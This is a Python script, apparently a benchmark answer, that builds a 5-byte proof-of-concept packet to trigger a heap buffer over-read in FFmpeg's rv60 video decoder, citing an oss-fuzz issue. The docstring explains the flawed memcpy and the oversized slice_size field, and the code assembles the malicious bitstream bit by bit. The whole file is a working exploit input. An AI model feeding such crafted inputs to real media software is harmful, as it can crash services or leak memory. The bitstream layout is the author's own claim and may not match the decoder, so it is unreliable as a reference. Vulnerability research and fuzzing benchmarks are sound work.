import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input that triggers a Heap Buffer Overflow
        in the rv60dec decoder of FFmpeg (oss-fuzz:385170375).

        The vulnerability is in the `ff_rv60_decode_picture` function. A
        `memcpy` reads slice data from the main packet buffer, with the size
        of the read determined by a 20-bit `slice_size` field from the
        bitstream. An out-of-bounds read occurs if `slice_size` is larger
        than the number of bytes remaining in the packet buffer.

        This PoC is a minimal packet that:
        1. Sets up the decoder with an I-frame header. This self-contained
           header specifies the frame dimensions, avoiding reliance on any
           external codec context.
        2. Provides a `slice_size` value that is intentionally larger than
           the remaining packet data, triggering the overflow during the
           `memcpy` operation.

        The PoC is constructed at the bit-level to be as small as possible:
        - Packet type (2 bits): 1 (I-frame)
        - Custom size flag (1 bit): 0 (use predefined sizes)
        - Predefined size index (3 bits): 0 (for 128x96 resolution, implies mb_pos_bits=6)
        - qscale (5 bits): 1 (arbitrary)
        - skip (2 bits): 0 (reserved)
        - mb_pos (6 bits): 0 (start of slice)
        - slice_size (20 bits): 2 (the malicious value)

        The total header size is 39 bits, which requires 5 bytes (40 bits) for storage.
        After the decoder reads the 39-bit header, the byte offset is floor(39/8) = 4.
        In a 5-byte packet, only 1 byte remains (at index 4).
        The `memcpy` attempts to read `slice_size` (which is 2) bytes from this position,
        causing a 1-byte heap buffer overflow read.
        """
        bits = []
        
        # Frame header: 13 bits
        # Packet type: 1 (I-frame)
        bits.extend([0, 1])
        # Custom picture size flag: 0 (use predefined sizes)
        bits.append(0)
        # Predefined size index: 0 (128x96 resolution)
        bits.extend([0, 0, 0])
        # qscale: 1
        bits.extend([0, 0, 0, 0, 1])
        # skip: 0 (reserved)
        bits.extend([0, 0])
        
        # Slice header: 26 bits
        # mb_pos: 0
        bits.extend([0, 0, 0, 0, 0, 0])
        
        # slice_size: 2
        slice_size = 2
        slice_size_bits = [int(b) for b in bin(slice_size)[2:].zfill(20)]
        bits.extend(slice_size_bits)
        
        # Total bits = 39. Pad to 40 bits (5 bytes).
        while len(bits) % 8 != 0:
            bits.append(0)
            
        # Convert bit list to bytearray
        poc_bytes = bytearray()
        for i in range(0, len(bits), 8):
            byte = 0
            for bit in bits[i:i+8]:
                byte = (byte << 1) | bit
            poc_bytes.append(byte)
            
        return bytes(poc_bytes)
